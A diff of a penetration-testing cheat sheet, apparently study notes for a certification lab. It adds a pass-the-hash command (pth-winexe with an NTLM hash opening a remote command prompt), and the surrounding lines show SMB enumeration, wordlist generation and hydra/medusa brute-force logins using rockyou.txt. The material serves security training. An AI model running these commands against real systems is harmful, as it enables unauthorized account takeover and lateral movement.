@@ -173,7 +173,6 @@ cme smb 10.10.11.152 -u 'anon' -p '' --shares
 
 
 # Cracking
-## Wordlists
 #### cewl
 create wordlist from megacorpone.com with a minimum length of 6, output to file "megacorp-cewl.txt"
 `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`
@@ -181,6 +180,7 @@ create wordlist from megacorpone.com with a minimum length of 6, output to file 
 #### john
 create wordlist from text file with "rules" applied
 `john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt grep Nanobot mutated.txt`
+
 
 #### crunch
 create a password with minimum and maximum length of 8, -t to specify specific pattern. This will be a large list. (see man page)
@@ -190,7 +190,6 @@ create list based off specific characters and write to a file
 create list using mixedalpha, present in charset.lst
 `crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt`
 
-## Attacks
 #### medusa
 use rockyou.txt to attack /admin endpoint as admin user , use HTTP authentication scheme (-M)
 `medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`
@@ -205,7 +204,9 @@ hydra ssh attack using kali username and rockyou.txt
 hydra HTTP POST attack specifying username "admin" with "INVALID LOGIN" being a failure criteria
 `hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`
 
-
+#### pass the hash - winexe
+use pth-winexe to pass the hash, executing a command prompt 
+`pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd`
 
 
 
